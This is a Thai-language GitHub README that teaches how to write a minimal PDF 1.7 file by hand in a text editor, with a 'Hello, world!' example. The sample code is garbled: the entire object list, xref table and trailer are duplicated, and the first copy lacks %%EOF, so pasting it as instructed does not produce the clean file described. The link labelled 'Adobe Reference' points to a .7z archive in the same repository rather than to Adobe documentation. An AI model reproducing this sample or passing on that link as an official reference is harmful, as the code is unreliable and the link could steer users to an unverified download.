<p align="center">
  <img src="https://github.com/KravitzMC/IntroductionToPDF-/blob/main/file_type_pdf_icon_130274.png">
</p>

#  Introduction to Render PDF 

พื้นฐานการ Render PDF ความเป็นจริงต้องการ Learning Curve สูงเป็นอย่างมาก หลังจากที่ได้ศึกษาวิธีการ Render PDF บนเอกสาร 
### <a href="https://github.com/KravitzMC/IntroductionToRenderPDF/raw/main/PDF_Reference.7z" title="Learn Markdown">Adobe Reference</a> พบว่ายุ่งยากพอสมควร แต่การ PDF Render แบบง่าย ๆใช้แค่ Text Editor ธรรมดาอย่าง Notepad ก็ทำได้แล้วจริง ๆ จากโค้ดข้างล่าง

<p align="center">
  <img src="https://miro.medium.com/max/986/1*rkRfUKpT-8OmVwJyXp9k2g.png">
</p>

#### ตัวอย่าง PDF Structure Version 1.7 (โดยให้เราทำการ  Save File) เป็น sample.pdf 
(Paste Notepad or Any Text Editor)

```
%PDF-1.7

1 0 obj  % entry point
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /MediaBox [ 0 0 200 200 ]
  /Count 1
  /Kids [ 3 0 R ]
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /Resources <<
    /Font <<
      /F1 4 0 R 
    >>
  >>
  /Contents 5 0 R
>>
endobj

4 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Times-Roman
>>
endobj

5 0 obj  % page content
<<
  /Length 44
>>
stream
BT
70 50 TD
/F1 12 Tf
(Hello, world!) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000173 00000 n 
0000000301 00000 n 
0000000380 00000 n 
trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
492
%PDF-1.7

1 0 obj  % entry point
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /MediaBox [ 0 0 200 200 ]
  /Count 1
  /Kids [ 3 0 R ]
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /Resources <<
    /Font <<
      /F1 4 0 R 
    >>
  >>
  /Contents 5 0 R
>>
endobj

4 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Times-Roman
>>
endobj

5 0 obj  % page content
<<
  /Length 44
>>
stream
BT
70 50 TD
/F1 12 Tf
(Hello, world!) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000173 00000 n 
0000000301 00000 n 
0000000380 00000 n 
trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
492
%%EOF
```

### ผลลัพธ์จะออกมาเป็นดังรูป

![image-20210831225121354](https://github.com/KravitzMC/IntroductionToPDF-/blob/main/sample.png)

#### เราสามารถนำวิธีการแนวทางนี้ไปประยุกต์เขียนโปรแกรมด้วยภาษาต่าง ๆ ตามที่เราต้องการสุดจะแล้วแต่ ไม่ว่าจะ Render, Split, Merge แต่ควรทำความเข้าใจ PDF Structure ให้เป็นอย่างดีเสียก่อน

### PDF Structure

<p align="center">
  <img src="https://raw.githubusercontent.com/KravitzMC/IntroductionToRenderPDF/main/pdf_ange_albertini.png">
</p>

ดูข้อมูลเพิ่มเติมได้ที่ : <a href="https://github.com/zbetcheckin/PDF_analysis" title="Learn Markdown"> PDF Analysis </a>

